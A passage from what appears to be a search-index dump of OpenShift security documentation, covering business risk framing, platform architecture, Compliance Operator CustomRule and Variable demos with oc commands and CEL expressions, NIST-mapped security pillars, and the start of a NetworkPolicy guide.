business liquidation events.</p>"},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#4-the-lateral-movement-risk-segmentation","title":"4. The \"Lateral Movement\" Risk (Segmentation)","text":"<p>Most internal networks are \"flat\"\u2014once an attacker gets through the front door of a minor web app, they have a clear path to your backend financial databases. Are you comfortable with the fact that your most sensitive customer data is just one \"hop\" away from your least secure application?</p> <p>Inability to contain a breach turns a small incident into a Headlines-Making Disaster. The difference between losing one non-critical web server and losing 10 million customer records is determined entirely by your ability to stop lateral movement.</p>"},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#5-the-revenue-protection-risk-availability-resiliency","title":"5. The \"Revenue Protection\" Risk (Availability &amp; Resiliency)","text":"<p>Security includes Availability. Which is the bigger risk: an external hacker, or a \"buggy\" application that accidentally consumes all the CPU and crashes your production billing system? If your critical security and logging tools are starved of resources by a \"noisy neighbor,\" how can you even defend yourself?</p> <p>This is about Revenue Continuity. Security isn't just about blocking bad actors; it\u2019s about ensuring your business stays online. Unplanned downtime due to resource exhaustion is a self-inflicted Denial of Service (DoS) that directly hits the bottom line.</p>"},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#6-the-active-defense-risk-runtime-vulnerability-drift","title":"6. The \"Active Defense\" Risk (Runtime, Vulnerability &amp; Drift)","text":"<p>Scanning code at the build stage is like checking luggage at the airport\u2014it doesn't tell you what the passenger does once they are on the plane. If an attacker bypasses your gates and starts moving data out slowly, how would you know? Furthermore, if a \"temporary\" security fix is made today, who ensures it doesn't become a permanent backdoor tomorrow?</p> <p>Most breaches go undetected for months (Dwell Time). This is where the real damage happens. Every day an intruder stays hidden, the cost of the breach multiplies. You need a system that detects the intent of an attacker and \"self-heals\" when your security posture starts to decay.</p>"},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#risk-vs-resolution-summary","title":"Risk vs. Resolution Summary","text":"The Business Risk The Real-World Consequence The Platform Strategic Value Supply Chain Poisoning Running malicious code with your \"stamp of approval.\" Automated Provenance: Cryptographic verification of origin. Infrastructure Takeover One compromised app seizing the whole cluster. Native Hardening: Mandatory isolation and \"safety brakes.\" Credential Theft A single stolen admin key wiping out the domain. Identity Governance: Granular, identity-based access control. Lateral Breach Attackers \"jumping\" from web apps to databases. Network Segregation: Explicit, visualized traffic boundaries. Unplanned Downtime \"Noisy neighbors\" crashing your billing systems. Availability Guardrails: Enforced resource \"Oxygen\" for apps. Undetected Dwell Time Attackers staying inside your network for months. Behavioral Defense: Real-time detection of active intent."},{"location":"compliance/architecture%20and%20threat%20awareness/","title":"OpenShift Security Architecture","text":"<p>OpenShift's security is built on top of Kubernetes and hardened with additional features to secure the cluster, the applications, and the development process.</p>"},{"location":"compliance/architecture%20and%20threat%20awareness/#1-control-plane-security-master-nodes","title":"1. Control Plane Security (Master Nodes)","text":"<p>This is the heart of the cluster, and its security is paramount.</p> <ul> <li>API Server and etcd: The Kubernetes API server is the front-end. etcd is the distributed key-value store holding all cluster configuration and sensitive data (like Secrets).<ul> <li>Architecture Control: Strong authentication (e.g., OAuth, LDAP) and Role-Based Access Control (RBAC) are enforced for all access.</li> <li>Data Protection: etcd data should be encrypted at rest to protect sensitive information even if the backup is exposed.</li> </ul> </li> <li>Authentication and Authorization:<ul> <li>RBAC: Carefully defining <code>Roles</code>/<code>ClusterRoles</code> and <code>RoleBindings</code>/<code>ClusterRoleBindings</code> to adhere to the principle of least privilege. Avoid using broad, cluster-wide administrator roles.</li> </ul> </li> </ul>"},{"location":"compliance/architecture%20and%20threat%20awareness/#2-node-security-worker-nodes","title":"2. Node Security (Worker Nodes)","text":"<p>These nodes run your container workloads.</p> <ul> <li>Immutable OS: OpenShift uses Red Hat CoreOS (RHCOS), a minimal, security-focused, immutable operating system that minimizes the attack surface.</li> <li>SELinux: Used to enforce mandatory access controls, which provides an extra layer of isolation between containers and the host OS, as well as between containers themselves.</li> <li>CRI-O: The default container runtime, which is lightweight and security-focused, designed specifically for Kubernetes.</li> <li>Host Hardening: Following general Linux security best practices (e.g., promptly patching the OS, disabling unused services).</li> </ul>"},{"location":"compliance/architecture%20and%20threat%20awareness/#3-application-and-container-security","title":"3. Application and Container Security","text":"<p>This focuses on the running workloads and their associated images.</p> <ul> <li>Security Context Constraints (SCCs): This is an OpenShift-specific feature that controls what actions a pod can perform, what resources it can access, and what privileges it can run with. SCCs are crucial for enforcing the principle of least privilege for containers (e.g., running as non-root, limiting volume types, restricting host access).</li> <li>Image Security:<ul> <li>Vulnerability Scanning: Integrating tools (like the built-in image registry scanner or Red Hat Advanced Cluster Security - RHACS) into your CI/CD pipeline to scan container images for known Common Vulnerabilities and Exposures (CVEs).</li> <li>Content Trust: Using image signing to verify the integrity and source of the images before deployment.</li> </ul> </li> <li>Secrets Management: Utilizing dedicated services (like IBM Cloud Secrets Manager, Vault, or OpenShift's Secrets) to store and manage sensitive data, rather than embedding them in container images or configuration files.</li> </ul>"},{"location":"compliance/architecture%20and%20threat%20awareness/#4-network-and-multi-tenancy-security","title":"4. Network and Multi-Tenancy Security","text":"<p>Isolation is key in a shared environment.</p> <ul> <li>Projects and Namespaces: OpenShift's Projects (an extension of Kubernetes Namespaces) are fundamental for resource organization and isolation between teams or applications.</li> <li>Network Policies: These define how groups of pods are allowed to communicate with each other and with external network endpoints, enforcing a zero-trust network model.</li> </ul>"},{"location":"compliance/architecture%20and%20threat%20awareness/#threat-awareness-and-mitigation","title":"Threat Awareness and Mitigation","text":"<p>A security architecture is only as good as the understanding of the threats it is designed to mitigate.</p> Threat Category Specific Threats Mitigation in OpenShift Vulnerable Containers Exploitable CVEs in application dependencies or base OS images. Image Scanning in CI/CD, using trusted/minimal base images, and enabling Image Security Enforcement admission controllers. Misconfigurations Overly permissive RBAC roles, insecure default settings, or exposed services. Strict RBAC Granularity and regular Audit/Review of roles and constraints. Using Network Policies for egress/ingress control. Container Breakout/Escalation A compromised container gains access to the host node's operating system or other containers. SCCs to run containers as non-root with limited capabilities. Strong SELinux profiles on the nodes. Data Breach Sensitive data (secrets, configuration) stored in an unencrypted or exposed manner. Encrypting etcd at rest. Using dedicated Secrets Managers and limiting access to Secrets via RBAC. Supply Chain Attack Malicious code injected into the CI/CD pipeline, often through compromised base images or third-party dependencies. Image Signing/Content Trust to verify image source. Reviewing and hardening the CI/CD pipeline itself. Insider Threats Users (or service accounts) with excessive permissions causing intentional or accidental damage. Strict adherence to Least Privilege. Audit Logging and monitoring to track all API server actions."},{"location":"compliance/architecture%20and%20threat%20awareness/#continuous-monitoring-and-response","title":"Continuous Monitoring and Response","text":"<p>A secure environment requires continuous vigilance:</p> <ul> <li>Audit Logging: OpenShift automatically generates detailed audit logs for the API server. These logs must be collected, stored centrally, and monitored for suspicious activity.</li> <li>Runtime Security: Tools like Red Hat Advanced Cluster Security (RHACS) provide runtime detection and response for anomalous container behavior, even for zero-day attacks.</li> <li>Compliance Operator: OpenShift provides an operator to automate checking and reporting against compliance benchmarks (like CIS).</li> </ul>"},{"location":"compliance/compliance-operator-demo/","title":"OpenShift Compliance Operator: CustomRule Demos","text":"<p>This guide explains how to run and interpret the custom compliance checks available in the <code>security-demos</code> repository. These demos use the Compliance Operator and CEL (Common Expression Language) to enforce organization-specific policies without writing Go code.</p>"},{"location":"compliance/compliance-operator-demo/#1-setup","title":"1. Setup","text":""},{"location":"compliance/compliance-operator-demo/#prerequisites","title":"Prerequisites","text":"<ul> <li>OpenShift Cluster with Compliance Operator installed.</li> <li>Cluster Admin access.</li> <li><code>oc</code> CLI tool.</li> <li>Target Namespace: <code>openshift-compliance</code>.</li> </ul>"},{"location":"compliance/compliance-operator-demo/#get-the-manifests","title":"Get the Manifests","text":"<p>Clone the repository containing the pre-built Rules, Profiles, and Bindings:</p> <pre><code>git clone https://github.com/ralvares/security-demos.git\ncd security-demos/compliance/manifests\n</code></pre>"},{"location":"compliance/compliance-operator-demo/#2-demo-flow-apply-rules-label-namespaces-and-observe-failures","title":"2. Demo Flow: Apply Rules, Label Namespaces, and Observe Failures","text":"<p>This demo shows how CustomRules behave before and after labeling namespaces for enforcement. We'll apply the rules first (no enforcement yet), check that they pass, then label namespaces to trigger failures, and rerun the scans.</p>"},{"location":"compliance/compliance-operator-demo/#step-1-apply-the-rules-no-enforcement-yet","title":"Step 1: Apply the Rules (No Enforcement Yet)","text":"<p>Apply the use case manifests. Since no namespaces are labeled <code>custom.security/enforce=true</code>, the rules will pass (no resources to check).</p> <pre><code># Apply all use cases (RBAC, Network Policy, Pod Security, Image Supply Chain)\noc apply -k rbac\noc apply -k network-policy\noc apply -k pod-security\noc apply -k image-supply-chain\n</code></pre>"},{"location":"compliance/compliance-operator-demo/#step-2-check-initial-results-should-pass","title":"Step 2: Check Initial Results (Should Pass)","text":"<p>The Compliance Operator will run scans. Since no namespaces are enforced, all rules should pass.</p> <pre><code># Wait for scans to complete\noc get compliancesuite -n openshift-compliance\n\n# Check results\noc get compliancecheckresults -n openshift-compliance\n</code></pre> <p>Expected Output: All results should show <code>PASS</code> (e.g., <code>rbac-checks-cluster-admin-allow-list PASS high</code>).</p> <pre><code>NAME                                                              STATUS   SEVERITY\nimage-supply-chain-checks-allowed-registries-pod-images           PASS     medium\nimage-supply-chain-checks-disallow-shadow-databases               PASS     high\nnetworkpolicy-security-checks-netpol-disallow-allow-all-labeled   PASS     high\nnetworkpolicy-security-checks-netpol-require-deny-all-labeled     PASS     high\nrbac-checks-cluster-admin-allow-list                              PASS     high\nsensitive-pod-security-checks-detect-privileged-pods              PASS     high\nsensitive-pod-security-checks-detect-sensitive-hostpath-mounts    PASS     high\nsensitive-pod-security-checks-detect-token-automount              PASS     medium\n</code></pre>"},{"location":"compliance/compliance-operator-demo/#step-3-label-namespaces-for-enforcement","title":"Step 3: Label Namespaces for Enforcement","text":"<p>Label the demo namespaces (<code>payments</code> and <code>frontend</code>) to enable enforcement. This activates the rules for resources in those namespaces.</p> <pre><code>oc label namespace payments custom.security/enforce=true --overwrite\noc label namespace frontend custom.security/enforce=true --overwrite\n</code></pre> <p>Note: The pod automount rule now uses a namespace-level allow label <code>custom.security/automount=true</code>. Labeling the <code>frontend</code> namespace exempts all pods in that namespace (for example, <code>webapp</code> and <code>blog</code>).</p> <pre><code># Label the frontend namespace to exempt its pods from the automount check\noc label namespace frontend custom.security/automount=true --overwrite\n</code></pre>"},{"location":"compliance/compliance-operator-demo/#step-4-force-a-rerun-delete-compliancescans","title":"Step 4: Force a Rerun (Delete ComplianceScans)","text":"<p>Delete the existing scans to force the Compliance Operator to re-evaluate with the new labels.</p> <pre><code># Delete scans for each use case (adjust names if different in your cluster)\noc delete compliancescan rbac-checks -n openshift-compliance\noc delete compliancescan networkpolicy-security-checks -n openshift-compliance\noc delete compliancescan sensitive-pod-security-checks -n openshift-compliance\noc delete compliancescan image-supply-chain-checks -n openshift-compliance\n</code></pre>"},{"location":"compliance/compliance-operator-demo/#step-5-check-results-after-labeling-should-fail","title":"Step 5: Check Results After Labeling (Should Fail)","text":"<p>The scans will rerun. Now that namespaces are labeled, the rules will evaluate resources and fail due to violations.</p> <pre><code># Wait for reruns to complete\noc get compliancesuite -n openshift-compliance\n\n# Check results\noc get compliancecheckresults -n openshift-compliance\n</code></pre> <p>Expected Output: Several results should now show <code>FAIL</code> (e.g., <code>sensitive-pod-security-checks-detect-privileged-pods FAIL high</code>).</p>"},{"location":"compliance/compliance-operator-demo/#understanding-the-failures","title":"Understanding the Failures","text":"<p>With namespaces labeled, the rules detect real issues in the demo cluster:</p> <ul> <li>Pod Security Failures: The <code>visa-processor</code> ServiceAccount in <code>payments</code> namespace has pods with:</li> <li>Privileged containers (<code>detect-privileged-pods</code> fails).</li> <li>Service account token automount enabled (<code>detect-token-automount</code> fails).</li> <li> <p>Additionally, <code>visa-processor</code> is bound to <code>cluster-admin</code> (RBAC failure), but this is cluster-scoped.</p> </li> <li> <p>Network Policy Failures: Neither <code>payments</code> nor <code>frontend</code> namespaces have any NetworkPolicies, so:</p> </li> <li><code>netpol-require-deny-all-in-labeled-namespaces</code> fails (no deny-all policy).</li> <li> <p><code>netpol-disallow-allow-all-in-labeled-namespaces</code> passes (no allow-all policies to detect).</p> </li> <li> <p>Image Supply Chain Failures: Pods in labeled namespaces may use images from unapproved registries (not <code>quay.io/</code> or <code>registry.redhat.io/</code>).</p> </li> <li> <p>RBAC Failures: Cluster-scoped checks (like <code>cluster-admin-allow-list</code>) fail if unauthorized subjects are bound to <code>cluster-admin</code> (e.g., <code>visa-processor</code> ServiceAccount).</p> </li> </ul> <p>To debug a specific failure, inspect the result:</p> <pre><code>oc get compliancecheckresult &lt;result-name&gt; -n openshift-compliance -o yaml\n</code></pre> <p>For example, to find which pods are privileged:</p> <pre><code>for ns in payments frontend; do\n  echo \"Namespace: $ns\"\n  oc get pods -n \"$ns\" -o json | jq -r '.items[] | select(.spec.containers[]?.securityContext.privileged == true) | \"\\(.metadata.name) has privileged container\"'\ndone\n</code></pre>"},{"location":"compliance/compliance-operator-demo/#step-6-reset-cleanup","title":"Step 6: Reset / Cleanup","text":"<p>To remove scans and rules:</p> <pre><code>oc delete -k rbac\noc delete -k network-policy\noc delete -k pod-security\noc delete -k image-supply-chain\n\n# Remove labels\noc label namespace payments custom.security/enforce- || true\noc label namespace frontend custom.security/enforce- || true\n</code></pre>"},{"location":"compliance/compliance-operator-variables/","title":"Using <code>Variables</code> to Simplify CEL Expressions","text":"<p>This guide demonstrates how to use <code>Variable</code> CRs to separate compliance data from compliance expressions, making <code>CustomRules</code> more maintainable and easier to customize.</p>"},{"location":"compliance/compliance-operator-variables/#the-problem","title":"The Problem","text":"<p>When writing <code>CustomRules</code> with CEL expressions, you might need to check specific values that change across deployments or environments. One good example of this would be allow-lists or deny-lists. Hardcoding these lists directly in the CEL expression makes them difficult to maintain:</p> <pre><code>expression: |-\n  resource.subjects.all(subject,\n    subject.name in [\n      'user1',\n      'user2',\n      'user3'\n    ]\n  )\n</code></pre> <p>Potential issues when using this approach: - Updating the list requires modifying the <code>CustomRule</code> expression - No separation between the compliance logic and the data being checked - Difficult for organizations to customize without understanding CEL syntax - Changes require re-validating the entire <code>CustomRule</code></p>"},{"location":"compliance/compliance-operator-variables/#separating-data-from-expressions","title":"Separating Data from Expressions","text":"<p>The Compliance Operator already has a <code>Variable</code> custom resource, which users have leveraged in the past to tweak the behavior of SCAP/OVAL rules. The same concept applies with <code>CustomRule</code> objects, where we need to separate the data from the logic.</p>"},{"location":"compliance/compliance-operator-variables/#step-1-create-variable-crs","title":"Step 1: Create <code>Variable</code> CRs","text":"<p>Create separate <code>Variable</code> resources for each list of values you need to check. In this example, the <code>Variable</code> value will be a comma-delimited list. Because we're using a CRD inside the CEL expression, we need to keep the following in mind:</p> <ul> <li><code>Variable</code> <code>metadata.name</code> must follow Kubernetes RFC 1123 naming (lowercase alphanumeric, hyphens, and dots only)</li> <li><code>Variable</code> <code>id</code> is used in CEL expressions and must be a valid CEL identifier (alphanumeric only, no hyphens)</li> </ul> <p>Example Variable: <pre><code>apiVersion: compliance.openshift.io/v1alpha1\nkind: Variable\nmetadata:\n  name: cluster-admin-users-var\n  namespace: openshift-compliance\nid: cluster-admin-users-var\ntitle: Allowed users for cluster-admin role\ndescription: |-\n  Comma-delimited list of user names that are permitted to be\n  bound to the cluster-admin ClusterRoleBinding. Organizations should\n  customize this list according to their security policies.\n  Format: ,user1,user2,user3, (comma at start and end for exact matching)\ntype: string\nvalue: ',kubeadmin,system:admin,alice@my-company.com,'\n</code></pre></p> <p>Notice that the value is prefixed and postfixed with commas, which allows us to do exact matching in the expression.</p>"},{"location":"compliance/compliance-operator-variables/#step-2-add-variables-as-inputs-to-your-customrule","title":"Step 2: Add <code>Variables</code> as Inputs to Your <code>CustomRule</code>","text":"<p>The <code>CustomRule</code> already accepts Kubernetes inputs via the <code>kubernetesInputSpec</code>. We can use that here since a <code>Variable</code> is just a custom resource:</p> <pre><code>apiVersion: compliance.openshift.io/v1alpha1\nkind: CustomRule\nmetadata:\n  name: my-custom-rule\n  namespace: openshift-compliance\nspec:\n  inputs:\n    - kubernetesInputSpec:\n        apiVersion: rbac.authorization.k8s.io/v1\n        resource: clusterrolebindings\n      name: crbs\n    - kubernetesInputSpec:\n        apiVersion: compliance.openshift.io/v1alpha1\n        resource: variables\n        resourceName: cluster-admin-users-var\n        resourceNamespace: openshift-compliance\n      name: allowedusers\n    - kubernetesInputSpec:\n        apiVersion: compliance.openshift.io/v1alpha1\n        resource: variables\n        resourceName: cluster-admin-groups-var\n        resourceNamespace: openshift-compliance\n      name: allowedgroups\n</code></pre> <p>Make sure you're looking for <code>Variable</code> instances in the <code>openshift-compliance</code> namespace, since they're owned by the Compliance Operator.</p>"},{"location":"compliance/compliance-operator-variables/#step-3-reference-variables-in-your-cel-expression","title":"Step 3: Reference <code>Variables</code> in Your CEL Expression","text":"<p>Access the <code>Variable</code> value using <code>.value</code> and use <code>.contains()</code> for checking membership:</p> <pre><code>expression: |-\n  crbs.items.filter(crb, crb.metadata.name == 'cluster-admin')[0]\n    .subjects.all(subject,\n      (subject.kind == 'User' &amp;&amp; allowedusers.value.contains(',' + subject.name + ',')) ||\n      (subject.kind == 'Group' &amp;&amp; allowedgroups.value.contains(',' + subject.name + ','))\n    )\n</code></pre> <p>Make sure you're referencing the variable in the expression using the <code>name</code> from the <code>kubernetesInputSpec</code>. You can access the value directly in the expression using <code>allowedusers.value</code>. Using the CEL <code>contains()</code> filter with comma wrapping provides exact matching (e.g., <code>admin</code> won't match <code>kubeadmin</code>).</p>"},{"location":"compliance/compliance-operator-variables/#step-4-add-variables-to-your-kustomization-optional","title":"Step 4: Add <code>Variables</code> to Your Kustomization (Optional)","text":"<p>This gist includes a Kustomization, making it easier to apply the custom rules, variables, tailored profiles, and bindings with a single command.</p> <pre><code>resources:\n  - cluster-admin-allowed-users-variable.yaml\n  - cluster-admin-allowed-groups-variable.yaml\n  - cluster-admin-allowed-serviceaccounts-variable.yaml\n  - cluster-admin-allow-list.yaml\n  - tailored-profile.yaml\n  - scan-setting-binding.yaml\n</code></pre> <p>Apply the example in a cluster with Compliance Operator version 1.8.0 or greater:</p> <pre><code>oc apply -k .\n</code></pre> <p>See the <code>cluster-admin-allow-list.yaml</code> <code>CustomRule</code> in this gist for a complete working example that uses three <code>Variables</code>:</p> <ul> <li><code>allowedusers</code> - allowed users</li> <li><code>allowedgroups</code> - allowed groups</li> <li><code>allowedserviceaccounts</code> - allowed service accounts (in <code>namespace/name</code> format)</li> </ul>"},{"location":"compliance/compliance-operator-variables/#summary","title":"Summary","text":"<p>This example walks through how you can use the <code>Variable</code> resource in conjunction with the new <code>CustomRule</code> resource introduced in Compliance Operator 1.8.0 to keep compliance data and logic separate.</p> <p>The primary benefits include:</p> <ol> <li>Separation of concerns by keeping the compliance logic in the <code>CustomRule</code> and data in the <code>Variable</code></li> <li>Organizations can update allow-lists by editing <code>Variables</code>, not CEL expressions</li> <li>Changing values doesn't risk introducing syntax errors in the CEL expression</li> <li><code>Variables</code> can potentially be referenced by multiple <code>CustomRules</code></li> <li><code>Variable</code> descriptions explain what values are allowed and how to format them</li> </ol>"},{"location":"compliance/compliance-operator-variables/#best-practices","title":"Best Practices","text":"<ol> <li>Use descriptive <code>Variable</code> names it clear what the <code>Variable</code> contains</li> <li>Document the format and type of the variable (e.g., string) in the description of the <code>Variable</code></li> <li>Test your expressions by updating the <code>Variable</code> to ensure they pass and fail with various inputs</li> <li>Keep <code>Variables</code> focused to one distinct list of values</li> <li>Keep <code>Variables</code> in the same namespace as the <code>CustomRule</code></li> <li>Use functions and macros defined by the CEL language definition</li> </ol>"},{"location":"compliance/compliance-operator-variables/#common-patterns","title":"Common Patterns","text":""},{"location":"compliance/compliance-operator-variables/#allow-list-pattern","title":"Allow-list Pattern","text":"<p>Check if a value is in an approved list: <pre><code>allowedvalues.value.contains(',' + actual.value + ',')\n</code></pre></p>"},{"location":"compliance/compliance-operator-variables/#deny-list-pattern","title":"Deny-list Pattern","text":"<p>Check if a value is NOT in a prohibited list: <pre><code>!deniedvalues.value.contains(',' + actual.value + ',')\n</code></pre></p>"},{"location":"compliance/compliance-operator-variables/#multiple-conditions","title":"Multiple Conditions","text":"<p>Combine multiple <code>Variable</code> checks: <pre><code>allowedusers.value.contains(',' + user.name + ',') &amp;&amp;\n!deniedgroups.value.contains(',' + user.group + ',')\n</code></pre></p>"},{"location":"compliance/compliance-operator-variables/#updating-variables","title":"Updating <code>Variables</code>","text":"<p>To update an allow-list, simply edit the <code>Variable</code>:</p> <pre><code>kubectl edit variable cluster-admin-users-var -n openshift-compliance\n</code></pre> <p>Change the value maintaining the comma-delimited format: <pre><code>value: ',kubeadmin,system:admin,alice@my-company.com,bob@my-company.com,'\n</code></pre></p> <p>The next compliance scan will automatically use the updated values without requiring any changes to the <code>CustomRule</code>.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/","title":"The 8 Pillars of a Secure Container Platform","text":""},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#the-8-strategic-pillars-of-a-secure-container-platform","title":"The 8 Strategic Pillars of a Secure Container Platform","text":"<p>A resilient platform does more than just run apps; it governs how those apps live and behave. These pillars map directly to NIST SP 800-190 standards to reduce the impact of modern cyber threats.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#1-supply-chain-trust-software-provenance","title":"1. Supply Chain Trust &amp; Software Provenance","text":"<p>If you cannot verify the origin and integrity of your code, every other security tool in your stack can be bypassed. \"Shadow Code\" or tampered artifacts entering production represent a massive blind spot. By implementing a mandatory verification policy, you ensure that every container image is validated before it is ever allowed to run. The platform provides a tiered approach to this trust, using Image Digests to guarantee content hasn't changed and integrating with a Trusted Artifact Signer to verify origin. Enforcement is handled natively through admission controllers, ensuring only authorized, signed code starts.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#2-hardened-configuration-host-isolation","title":"2. Hardened Configuration &amp; Host Isolation","text":"<p>The risk of a \"Container Escape\" is real; if a container is misconfigured to run with root privileges, an attacker can break out and seize the underlying server. To prevent this, the platform enforces a \"Secure by Default\" posture that automatically blocks dangerous permissions. OpenShift is pre-hardened with Security Context Constraints (SCC) and Red Hat Enterprise Linux CoreOS. These native guardrails enforce SELinux mandatory access controls and strip away administrative privileges automatically, providing strict isolation at the kernel level without requiring manual effort from your developers.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#3-identity-governance-least-privilege","title":"3. Identity Governance &amp; Least Privilege","text":"<p>Credential sprawl is a silent killer of infrastructure. If a single administrator account is compromised in an unmanaged environment, an attacker can take over the entire domain. The solution is to centralize access control and ensure that both users and automated services operate under the principle of Least Privilege. By integrating natively with enterprise identity systems (LDAP, AD, OIDC) and enforcing granular Role-Based Access Control (RBAC), the platform ensures that every action is traceable and permissions are strictly scoped to specific projects rather than the entire cluster.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#4-dynamic-micro-segmentation-visibility","title":"4. Dynamic Micro-Segmentation &amp; Visibility","text":"<p>In a flat network, a breach of one minor application gives an attacker a clear path to your sensitive databases and internal APIs. To stop this Lateral Movement, you must build a segmented environment where traffic is restricted to only what is necessary for business logic. The platform utilizes NetworkPolicies and AdminNetworkPolicies to control these flows. For true defense, the Network Observability Operator provides flow analysis, while RHACS visualizes the actual traffic graph and can automatically generate recommended policies based on observed application behavior.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#5-resource-integrity-service-availability","title":"5. Resource Integrity &amp; Service Availability","text":"<p>Security includes Availability. A buggy application or a malicious process that consumes all available CPU and RAM can cause your critical business services to crash\u2014a self-inflicted Denial of Service (DoS). To guarantee Quality of Service (QoS), the platform acts as a digital governor using Resource Quotas and LimitRanges. This ensures that security agents and critical business apps always have the \"oxygen\" they need to remain stable, even during an application-level surge or an active attack.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#6-continuous-vulnerability-exposure-compliance-lifecycle","title":"6. Continuous Vulnerability Exposure &amp; Compliance Lifecycle","text":"<p>Security is not a one-time event; software that is secure today can become a liability tomorrow as new exploits are discovered. Relying on \"point-in-time\" manual audits creates a dangerous window of exposure. By shifting to Continuous Visibility, the platform uses the Compliance Operator to automatically check the infrastructure against NIST benchmarks every 24 hours. When combined with integrated scanning in Quay, it moves beyond simple list-making to Risk Prioritization\u2014identifying which vulnerabilities are actually exposed to the network and require immediate action.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#7-active-behavioral-system-integrity-defense","title":"7. Active Behavioral &amp; System Integrity Defense","text":"<p>Traditional scanners are blind to \"fileless\" attacks, unauthorized system file changes, or malicious activities like crypto-mining that occur while a container is running. You need real-time detection that can spot \"Silent Persistence\" and respond instantly. The File Integrity Operator monitors the platform\u2019s core files, while Advanced Cluster Security (ACS) watches runtime behavior. If an anomaly is detected, the platform doesn't just alert\u2014it can automatically terminate the compromised workload to stop the attack in progress.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#8-governance-as-code-immutable-auditing","title":"8. Governance-as-Code &amp; Immutable Auditing","text":"<p>The \"Audit Gap\" occurs when security settings drift over time due to manual fixes, making it impossible to prove compliance. To solve this, the platform establishes a single \"Source of Truth\" using RHACM and GitOps to automatically \"self-heal\" and revert any unauthorized changes. Furthermore, by managing a Software Bill of Materials (SBOM) through the Trusted Profile Analyzer, the platform provides full software transparency, allowing auditors to verify the composition of every running application instantly.</p>"},{"location":"compliance/the%208%20pillars%20of%20a%20secure%20container%20platform/#solution-mapping-nist-risk-to-red-hat-portfolio","title":"Solution Mapping: NIST Risk to Red Hat Portfolio","text":"NIST Security Domain Strategic Risk Red Hat Native &amp; Advanced Solutions Supply Chain (SA-12) Untrusted/Tampered Code Sigstore/Digests, Signer, Profile Analyzer, Quay, RHACS Config Management (CM-1) Breakouts / Drift SCCs, CoreOS, Compliance Operator, RHACM, GitOps Access Control (AC-6) Identity Hijacking OCP RBAC, Identity Integration, RHACM Boundary Protection (SC-7) Lateral Movement NetworkPolicies (Standard/Admin), NetObserv Operator, RHACS Vulnerability Scanning (RA-5) Known Vulnerabilities OCP Console Scanning, RHACS, Profile Analyzer, Quay System Integrity (SI-4) Zero-Day / Runtime Attacks File Integrity Operator, SELinux, RHACS Availability (CP-2) Resource Exhaustion (DoS) OpenShift Quotas &amp; Limits Audit &amp; Account (AU-2) Compliance Blind Spots OCP Audit Logs, RHACS, RHACM Asset Inventory (CM-8) Hidden Library Risk (SBOM) Developer Hub &amp; Profile Analyzer"},{"location":"networking/","title":"Network Policies","text":""},{"location":"networking/#what-are-network-policies","title":"What Are Network Policies","text":"<p>By default, Kubernetes behaves as if it trusts everything in your cluster. All pods can talk to all other pods, on all ports, at all times.</p> <p>Network Policies flip this around. They let you define, at L3/L4 (IP + port):</p> <ul> <li>Which pods may receive traffic (Ingress)</li> <li>Which pods may send traffic (Egress)</li> <li>Which namespaces or external IPs are allowed</li> <li>Which ports and protocols are open</li> </ul> <p>If your namespace has no Network Policies, then:</p> <ul> <li>All pods are considered non-isolated</li> <li>All traffic is allowed in and out</li> </ul> <p>This is still true in the latest GA API.</p> <p>Once any NetworkPolicy selects a pod for ingress or egress isolation, that traffic direction becomes restricted, and you must explicitly allow what you want.</p> <p>A NetworkPolicy flips that model:</p> <ul> <li>It selects a group of pods</li> <li>It defines whether we\u2019re controlling ingress, egress, or both</li> <li>It lists exactly who is allowed to communicate</li> </ul> <p>Anything not explicitly allowed becomes denied.</p> <p>NetworkPolicies give you:</p> <ul> <li>Isolation - pods only receive the traffic you approve</li> <li>Least privilege - each workload gets the minimal network access it needs</li> <li>Auditability - allowed flows are declared in YAML and tracked in Git</li> <li>Segmentation - clean boundaries between teams, apps, and environments</li> </ul> <p>In short: NetworkPolicies turn Kubernetes traffic from \u201canything goes\u201d to \u201conly what we approve.\u201d</p>"},{"location":"networking/#how-to-write-network-policies","title":"How to Write Network Policies","text":"<p>Writing NetworkPolicies starts with labels and selectors.</p>"},{"location":"networking/#labels","title":"Labels","text":"<p>Labels identify pods. Example:</p> <ul> <li><code>app: shopping</code></li> <li><code>tier: api</code></li> <li><code>role: search</code></li> </ul> <p>NetworkPolicies select pods by label, not by name or IP.</p>"},{"location":"networking/#selectors","title":"Selectors","text":"<p>Kubernetes supports these source/destination selectors:</p> <ol> <li><code>podSelector</code> - select pods in the same namespace</li> <li><code>namespaceSelector</code> - select namespaces by label (then all pods inside)</li> <li><code>namespaceSelector + podSelector</code> - select specific pods in specific namespaces</li> <li><code>ipBlock</code> - CIDR-based external ranges for cross-network rules (added since earlier talks)</li> </ol> <p><code>ipBlock</code> allows policies to explicitly allow or deny external CIDRs (note: NetworkPolicies are allow-only; ipBlock entries are used to permit external ranges).</p>"},{"location":"networking/#anatomy-of-a-networkpolicy","title":"Anatomy of a NetworkPolicy","text":"<p>Every NetworkPolicy answers three questions:</p> <ol> <li>Which pods does it apply to? (<code>podSelector</code>)</li> <li>Which direction? (<code>ingress</code>, who may connect to these pods; <code>egress</code>, where these pods may connect)</li> <li>What is allowed? (rules listing <code>from</code> / <code>to</code>, optional <code>ports</code>, optional <code>namespaceSelector</code> / <code>podSelector</code> / <code>ipBlock</code>)</li> </ol> <p>The GA structure is familiar and stable: policies select pods and express allow rules for ingress and/or egress.</p>"},{"location":"networking/#how-networkpolicies-work-the-rules","title":"How NetworkPolicies Work (The Rules)","text":"<p>We modernize the wording but keep the conceptual rules intact.</p> <p>Rule 1 - Pods without any NetworkPolicy are wide open. Selecting a pod is how you turn on isolation.</p> <p>Rule 2 - If a policy selects a pod but does not allow a specific flow, that flow is denied. Selecting a 